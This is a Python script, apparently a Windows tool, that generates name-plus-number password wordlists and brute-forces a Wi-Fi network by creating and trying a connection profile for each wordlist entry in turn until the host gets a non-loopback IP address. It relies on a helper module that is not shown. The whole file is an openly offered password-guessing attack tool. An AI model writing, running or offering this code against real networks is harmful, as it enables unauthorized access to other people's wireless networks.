import time, socket, WiFiFuctions
import os.path

print("\n-----------------------------------")
print("<!> Operating theater for Wi-Fi <!>")
print("-----------------------------------\n")


def Home():
    print("1) Make a simple word-list")
    print("2) Delete a Wi-Fi network profile ")
    print("3) Show available Wi-Fi networks")
    print("4) Connect to Wi-Fi networks\n")


Home()


def MakeWordlist(name, start, end):
    for i in range(start, end):
        print(name + str(i))
        files = open(name + "WordList" + ".txt", "a")
        files.writelines(name + str(i) + "\n")

    print("\nSuccessful")


option = int(input("Choose an option: "))

if option == 1:
    name = str(input("\nWiFi name or others: "))
    start = int(input("Starting number [year]: "))
    end = int(input("Ending number [year]: "))
    print()
    MakeWordlist(name, start, end)
    input()
    print(os.system("cls"))
    import WifiConnectivity

    input()


elif option == 2:
    name = str(input("\nEnter the wifi name: "))
    WiFiFuctions.DeleteNetworks(name)
    input()
    print(os.system("cls"))
    import WifiConnectivity

    input()

elif option == 3:

    interface = str(input("\nEnter the interface name (e.g: Wi-Fi 2): "))
    WiFiFuctions.displayAvailableNetworks(interface)
    input()
    print(os.system("cls"))
    import WifiConnectivity

    input()

elif option == 4:
    interface = str(input("\nEnter the interface name (e.g: Wi-Fi 2): "))
    name = str(input("Enter the wifi name: "))
    Wordfile = input("Word-file name: ")

    SleepTime = str(input("Delay to connect in (default sec: 3.00): "))

    if len(SleepTime) != 0:
        SleepTime = float(SleepTime)
        file = open(Wordfile)

        RS = file.readlines()

        NewRs = []

        for c in RS:
            NewRs.append(c.rstrip("\n"))

        for c in range(len(RS)):

            IPaddress = socket.gethostbyname(socket.gethostname())
            if IPaddress != "127.0.0.1":
                print("\n\n* * * * * * * * * * * * * * * * * * * * * * * *")
                print("[!][ Connected via --> IPv4: " + IPaddress + " ][!]")
                print("* * * * * * * * * * * * * * * * * * * * * * * *")
                input()
                break
            else:
                print("\n>>\nIPv4 --> " + IPaddress + " Loopback address")
                password = NewRs[c]
                print("Password --> " + NewRs[c] + "\n")
                WiFiFuctions.createNewConnection(name, name, password, interface)
                WiFiFuctions.connect(name, name, interface)
                print("\n----------------------------")
                print("<!> Not connect yet ]" + "[" + str(c + 1) + "] <!>")
                print("----------------------------")
                time.sleep(SleepTime)

    else:
        SleepTime = 3.00
        SleepTime = float(SleepTime)

        file = open(Wordfile)

        RS = file.readlines()

        NewRs = []

        for c in RS:
            NewRs.append(c.rstrip("\n"))

        for c in range(len(RS)):

            IPaddress = socket.gethostbyname(socket.gethostname())
            if IPaddress != "127.0.0.1":
                print("\n\n* * * * * * * * * * * * * * * * * * * * * * * *")
                print("[!][ Connected via --> IPv4: " + IPaddress + " ][!]")
                print("* * * * * * * * * * * * * * * * * * * * * * * *")
                input()
                break
            else:
                print("\n>>\nIPv4 --> " + IPaddress + " Loopback address")
                password = NewRs[c]
                print("Password --> " + NewRs[c] + "\n")
                WiFiFuctions.createNewConnection(name, name, password, interface)
                WiFiFuctions.connect(name, name, interface)
                print("\n----------------------------")
                print("<!> Not connect yet ]" + "[" + str(c + 1) + "] <!>")
                print("----------------------------")
                time.sleep(SleepTime)

else:
    print("\nInvalid input\n")
